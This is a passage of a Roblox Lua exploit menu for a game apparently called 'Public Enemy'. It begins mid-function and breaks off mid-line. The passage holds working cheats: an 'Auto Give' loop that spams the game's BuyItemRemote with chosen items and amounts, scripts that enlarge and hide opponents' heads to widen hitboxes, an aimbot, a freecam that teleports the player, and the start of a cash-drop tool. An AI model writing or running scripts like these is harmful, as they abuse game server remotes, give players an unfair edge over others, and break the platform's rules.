amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("ADJUSTABLE BIG HEAD (MONSY)", function()
   --// CONFIG
_G.HeadSize = 1 -- Start at 1x size
_G.Disabled = true -- Start disabled

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

--// ORIGINAL STORAGE
local OriginalSizes = {}
local OriginalTrans = {}
local OriginalBrickColor = {}
local OriginalMaterial = {}
local OriginalCanCollide = {}
local OriginalMassless = {}

--// APPLY FUNCTION
local function updateHead(head, player)
    if head and player ~= LocalPlayer then
        local key = player
        if not OriginalSizes[key] then
            OriginalSizes[key] = head.Size
            OriginalTrans[key] = head.Transparency
            OriginalBrickColor[key] = head.BrickColor
            OriginalMaterial[key] = head.Material
            OriginalCanCollide[key] = head.CanCollide
            OriginalMassless[key] = head.Massless
        end
        if not _G.Disabled then
            head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
            head.Transparency = 0.4
            head.BrickColor = BrickColor.new("Red")
            head.Material = Enum.Material.Neon
            head.CanCollide = false
            head.Massless = true
        else
            -- Restore original properties when disabled
            head.Size = OriginalSizes[key]
            head.Transparency = OriginalTrans[key]
            head.BrickColor = OriginalBrickColor[key]
            head.Material = OriginalMaterial[key]
            head.CanCollide = OriginalCanCollide[key]
            head.Massless = OriginalMassless[key]
        end
    end
end

--// UPDATE LOOP
RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                pcall(function()
                    updateHead(head, player)
                end)
            end
        end
    end
end)

--// INITIAL AND CONNECTIONS
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                updateHead(head, player)
            end
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local SizeLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "BIG HEAD SCRIPT"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0, 0, 1, 0) -- Initial for 1x ( (1-1)/9 = 0 )
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10) -- Initial for 1x
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = SliderBack

-- Size text display
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.45, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(0,0,0)
SizeLabel.TextSize = 14
SizeLabel.Font = Enum.Font.SourceSans
SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
SizeLabel.Parent = Frame

-- Toggle button for Enable/Disable
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- Black
ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "Disabled: On"
ToggleButton.Parent = Frame

-- Size slider logic
local dragging = false

local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newSize = 1 + percent * 9  -- 1 to 10 range
    _G.HeadSize = newSize
    SizeLabel.Text = "Size: " .. string.format("%.1f", newSize)
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local percent = (mousePos.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateSize(percent)
    end
end)

-- Toggle Enable/Disable
ToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    if _G.Disabled then
        ToggleButton.Text = "Disabled: On"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- Black
        ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
    else
        ToggleButton.Text = "Disabled: Off"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- Black
        ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
    end
end)

-- Initial setup
updateSize((_G.HeadSize - 1) / 34)
end)

addMainMenuButton("PERSIONAL SCRIPT FOR (MONSY)", function()
    --// CONFIG
_G.HeadSize = 1
_G.HeadTransparency = 0.8
_G.Disabled = true

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

--// ORIGINAL STORAGE
local Original = {}

local function storeOriginal(player, head)
	if not Original[player] then
		Original[player] = {
			Size = head.Size,
			Transparency = head.Transparency,
			Color = head.BrickColor,
			Material = head.Material,
			Collide = head.CanCollide,
			Massless = head.Massless
		}
	end
end

local function updateHead(head, player)
	if not head or player == LocalPlayer then return end
	storeOriginal(player, head)

	if not _G.Disabled then
		head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
		head.Transparency = _G.HeadTransparency
		head.BrickColor = BrickColor.new("Really red")
		head.Material = Enum.Material.Neon
		head.CanCollide = false
		head.Massless = true
	else
		local data = Original[player]
		if data then
			head.Size = data.Size
			head.Transparency = data.Transparency
			head.BrickColor = data.Color
			head.Material = data.Material
			head.CanCollide = data.Collide
			head.Massless = data.Massless
		end
	end
end

RunService.RenderStepped:Connect(function()
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
			pcall(function()
				updateHead(p.Character.Head, p)
			end)
		end
	end
end)

Players.PlayerAdded:Connect(function(p)
	p.CharacterAdded:Connect(function(c)
		c:WaitForChild("Head")
		updateHead(c.Head, p)
	end)
end)

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local function round(obj, r)
	local c = Instance.new("UICorner", obj)
	c.CornerRadius = UDim.new(0, r)
end

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 220, 0, 180)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.new(0,0,0)
Frame.Active = true
Frame.Draggable = true
round(Frame, 10)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "BIG HEAD SCRIPT"
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 16

-------------------------------------------------
-- SIZE SLIDER (WHITE)
-------------------------------------------------
local SliderBack = Instance.new("Frame", Frame)
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.27, 0)
SliderBack.BackgroundColor3 = Color3.new(0,0,0)
round(SliderBack, 8)

local SliderFill = Instance.new("Frame", SliderBack)
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.new(1,1,1)
round(SliderFill, 8)

local SliderButton = Instance.new("TextButton", SliderBack)
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.new(1,1,1)
SliderButton.Text = ""
round(SliderButton, 10)

local SizeLabel = Instance.new("TextLabel", Frame)
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.35, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.new(0,0,0)
SizeLabel.Text = "Size: " .. _G.HeadSize

local draggingSize = false

local function updateSize(percent)
	percent = math.clamp(percent, 0, 1)
	SliderFill.Size = UDim2.new(percent, 0, 1, 0)
	SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
	_G.HeadSize = 1 + percent * 34
	SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
end

SliderButton.MouseButton1Down:Connect(function() draggingSize = true end)
UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then draggingSize = false end end)
UIS.InputChanged:Connect(function(input)
	if draggingSize and input.UserInputType == Enum.UserInputType.MouseMovement then
		updateSize((UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X)
	end
end)

-------------------------------------------------
-- TRANSPARENCY SLIDER (WHITE)
-------------------------------------------------
local TBack = Instance.new("Frame", Frame)
TBack.Size = UDim2.new(0.8, 0, 0, 6)
TBack.Position = UDim2.new(0.1, 0, 0.55, 0)
TBack.BackgroundColor3 = Color3.new(0,0,0)
round(TBack, 8)

local TFill = Instance.new("Frame", TBack)
TFill.Size = UDim2.new(_G.HeadTransparency, 0, 1, 0)
TFill.BackgroundColor3 = Color3.new(1,1,1)
round(TFill, 8)

local TButton = Instance.new("TextButton", TBack)
TButton.Size = UDim2.new(0, 20, 0, 20)
TButton.Position = UDim2.new(_G.HeadTransparency, -10, 0.5, -10)
TButton.BackgroundColor3 = Color3.new(1,1,1)
TButton.Text = ""
round(TButton, 10)

local TLabel = Instance.new("TextLabel", Frame)
TLabel.Size = UDim2.new(1, 0, 0, 20)
TLabel.Position = UDim2.new(0, 0, 0.62, 0)
TLabel.BackgroundTransparency = 1
TLabel.TextColor3 = Color3.new(0,0,0)
TLabel.Text = "Transparency: " .. string.format("%.2f", _G.HeadTransparency)

local draggingT = false

local function updateTransparency(percent)
	percent = math.clamp(percent, 0, 1)
	TFill.Size = UDim2.new(percent, 0, 1, 0)
	TButton.Position = UDim2.new(percent, -10, 0.5, -10)
	_G.HeadTransparency = percent
	TLabel.Text = "Transparency: " .. string.format("%.2f", percent)
end

TButton.MouseButton1Down:Connect(function() draggingT = true end)
UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then draggingT = false end end)
UIS.InputChanged:Connect(function(input)
	if draggingT and input.UserInputType == Enum.UserInputType.MouseMovement then
		updateTransparency((UIS:GetMouseLocation().X - TBack.AbsolutePosition.X) / TBack.AbsoluteSize.X)
	end
end)

-------------------------------------------------
-- TOGGLE
-------------------------------------------------
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(0.8, 0, 0, 25)
ToggleButton.Position = UDim2.new(0.1, 0, 0.8, 0)
ToggleButton.BackgroundColor3 = Color3.new(0,0,0)
ToggleButton.TextColor3 = Color3.new(0,0,0)
ToggleButton.Text = "Disabled: On"
round(ToggleButton, 10)

ToggleButton.MouseButton1Click:Connect(function()
	_G.Disabled = not _G.Disabled
	ToggleButton.Text = _G.Disabled and "Disabled: On" or "Disabled: Off"
end)

updateSize((_G.HeadSize - 1) / 34)
updateTransparency(_G.HeadTransparency)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL SCRIPT FOR (VASCO)", function()
	--// CONFIG
_G.HeadSize = 1 -- Start at 1x size
_G.Disabled = true -- Start disabled for big head
_G.AimEnabled = false -- Start disabled for aimbot
_G.Smoothness = 1 -- Lower value for smoother aimbot tracking
_G.AimbotMode = "Instant" -- Options: "Instant", "Smooth"
_G.FOV = 4 -- Field of View in degrees

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera

--// ORIGINAL STORAGE
local OriginalSizes = {}
local OriginalTrans = {}
local OriginalBrickColor = {}
local OriginalMaterial = {}
local OriginalCanCollide = {}
local OriginalMassless = {}

--// HEAD SIZE FUNCTIONS
local function updateHead(head, player)
    if head and player ~= LocalPlayer then
        local key = player
        if not OriginalSizes[key] then
            OriginalSizes[key] = head.Size
            OriginalTrans[key] = head.Transparency
            OriginalBrickColor[key] = head.BrickColor
            OriginalMaterial[key] = head.Material
            OriginalCanCollide[key] = head.CanCollide
            OriginalMassless[key] = head.Massless
        end
        if not _G.Disabled then
            head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
            head.Transparency = 1 -- Fully invisible
            head.BrickColor = BrickColor.new("Red")
            head.Material = Enum.Material.Neon
            head.CanCollide = false
            head.Massless = true
        else
            -- Restore original properties when disabled
            head.Size = OriginalSizes[key]
            head.Transparency = OriginalTrans[key]
            head.BrickColor = OriginalBrickColor[key]
            head.Material = OriginalMaterial[key]
            head.CanCollide = OriginalCanCollide[key]
            head.Massless = OriginalMassless[key]
        end
    end
end

--// AIMBOT FUNCTIONS
local function getTargetPart(character)
    local head = character:FindFirstChild("Head")
    local neck = character:FindFirstChild("Neck")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local upperTorso = character:FindFirstChild("UpperTorso")
    local neckAttachment = upperTorso and upperTorso:FindFirstChild("NeckAttachment")
    if head then
        return head.Position
    elseif neck then
        return neck.CFrame.Position
    elseif neckAttachment then
        return neckAttachment.WorldPosition
    elseif humanoidRootPart then
        return humanoidRootPart.Position
    end
    return nil
end

local function getClosestPlayer()
    local closestTarget = nil
    local shortestDistance = math.huge
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Died:Connect(function()
                    player.Character = player.CharacterAdded:Wait()
                end)
                local targetPos = getTargetPart(character)
                if targetPos then
                    local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude
                    local screenPoint, onScreen = Camera:WorldToScreenPoint(targetPos)
                    if onScreen then
                        local toTarget = (targetPos - Camera.CFrame.Position).unit
                        local cameraForward = Camera.CFrame.LookVector
                        local angle = math.acos(cameraForward:Dot(toTarget)) * (180 / math.pi)
                        if angle <= _G.FOV and distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = targetPos
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end

local function aimAtTarget()
    local target = getClosestPlayer()
    if target then
        if _G.AimbotMode == "Instant" then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target)
        elseif _G.AimbotMode == "Smooth" then
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target), _G.Smoothness)
        end
    end
end

--// UPDATE LOOP
RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                pcall(function()
                    updateHead(head, player)
                end)
            end
        end
    end
    if _G.AimEnabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        aimAtTarget()
    end
end)

--// INITIAL AND CONNECTIONS
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                updateHead(head, player)
            end
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local SizeLabel = Instance.new("TextLabel")
local HeadToggleButton = Instance.new("TextButton")
local AimToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 180) -- Increased height for two buttons
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PERSONAL PABLOVASCO"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.25, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255)
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = SliderBack

-- Size text display
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.35, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(0,0,0)
SizeLabel.TextSize = 14
SizeLabel.Font = Enum.Font.SourceSans
SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
SizeLabel.Parent = Frame

-- Head toggle button
HeadToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
HeadToggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
HeadToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeadToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
HeadToggleButton.TextSize = 14
HeadToggleButton.Font = Enum.Font.SourceSansBold
HeadToggleButton.Text = ""
HeadToggleButton.Parent = Frame

-- Aimbot toggle button
AimToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
AimToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
AimToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
AimToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
AimToggleButton.TextSize = 14
AimToggleButton.Font = Enum.Font.SourceSansBold
AimToggleButton.Text = "Combine: Off"
AimToggleButton.Parent = Frame

-- Size slider logic
local dragging = false
local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newSize = 1 + percent * 9
    _G.HeadSize = newSize
    SizeLabel.Text = "Size: " .. string.format("%.1f", newSize)
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local percent = (mousePos.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateSize(percent)
    end
end)

-- Head toggle
HeadToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    if _G.Disabled then
        HeadToggleButton.Text = ""
        HeadToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    else
        HeadToggleButton.Text = ""
        HeadToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    end
end)

-- Aimbot toggle
AimToggleButton.MouseButton1Click:Connect(function()
    _G.AimEnabled = not _G.AimEnabled
    if _G.AimEnabled then
        AimToggleButton.Text = "Combine: On"
        AimToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    else
        AimToggleButton.Text = "Combine: Off"
        AimToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    end
end)

-- Initial setup
updateSize((_G.HeadSize - 1) / 9)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FREECAM TELEPORT PRESS Q (MONSY)", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 100
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.45
local MAX_PITCH = 90

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false
local lastCamCFrame -- ✅ store final freecam position

-- Helpers
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- ✅ Toggle freecam + TP on exit
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new()
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- ✅ Save final camera position before restoring
		lastCamCFrame = cam.CFrame

		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled

		-- ✅ Teleport character where freecam stopped
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and lastCamCFrame then
			player.Character.HumanoidRootPart.CFrame = CFrame.new(lastCamCFrame.Position)
		end
	end
end

-- Keybind
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CASH DROP (MONSY)", function()
	-- PUBLIC ENEMY CASH DROP — FULL WHITE THEME + BLACK TEXT
-- Mas maliit, mas malinis, zero dark elements

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "CashDropGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (Pure White)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 310, 0, 195)
frame.Position = UDim2.new(0.5, -155, 0.5, -97)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.new(1,1,1)     -- pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,44)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY CASH"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBlack
title.TextSize = 22
title.Parent = frame

-- Username Box (White bg na rin!)
local userBox = Instance.new("TextBox")
userBox.Size = UDim2.new(1,-40,0,40)
userBox.Position = UDim2.new(0,20,0,55)
userBox.BackgroundColor3 = Color3.new(1,1,1)        -- white bg
userBox.Text = player.Name
